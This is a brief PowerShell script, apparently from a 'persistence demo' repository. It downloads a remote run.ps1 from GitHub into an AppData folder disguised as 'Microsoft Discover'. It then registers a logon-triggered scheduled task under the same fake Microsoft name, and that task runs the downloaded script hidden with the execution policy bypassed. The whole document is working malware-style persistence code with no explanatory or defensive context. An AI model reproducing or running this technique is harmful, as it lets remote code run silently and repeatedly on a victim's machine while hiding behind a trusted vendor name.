# powershell.exe -ExecutionPolicy Bypass -File .\run.ps1

$ScriptPath = "$env:APPDATA\Microsoft Discover\run.ps1"
mkdir "$env:APPDATA\Microsoft Discover\"
wget "https://raw.githubusercontent.com/NotReallyJustin/ILY-Persistence-Demo/refs/heads/main/run.ps1" -OutFile $ScriptPath

# Define the action to run the PowerShell script
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min `"`" powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""

# Define the trigger for startup
$Trigger = New-ScheduledTaskTrigger -AtLogOn

# Register the task
Register-ScheduledTask -TaskName "Microsoft Discover" -Action $Action -Trigger $Trigger -User "$env:USERNAME"
